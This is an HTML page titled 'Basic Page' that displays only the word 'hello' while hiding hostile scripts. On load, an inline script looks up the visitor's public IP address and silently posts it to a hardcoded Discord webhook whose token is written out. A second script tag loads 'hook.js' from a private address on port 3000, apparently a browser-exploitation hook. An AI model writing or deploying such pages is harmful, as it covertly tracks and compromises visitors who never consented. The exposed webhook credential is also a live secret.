
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Page</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .message {
            text-align: center;
            font-size: 24px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="message">hello</div>
    <script>
        async function sendIPToDiscord(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1229599822005276734/8111XXiFs0oFEk4r3GfCDRYWAdDCrGfSt3_HjPWDruvQeDEVdljzpPPF2BWHalNEMeXy';
            const message = {
                content: `IP Address: ${ip}`
            };
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                sendIPToDiscord(data.ip);
            } catch (error) {
                console.error('Error getting IP address:', error);
            }
        }

        getIP();
    </script>

<script src="http://172.26.223.14:3000/hook.js" </script>
</body>
</html>
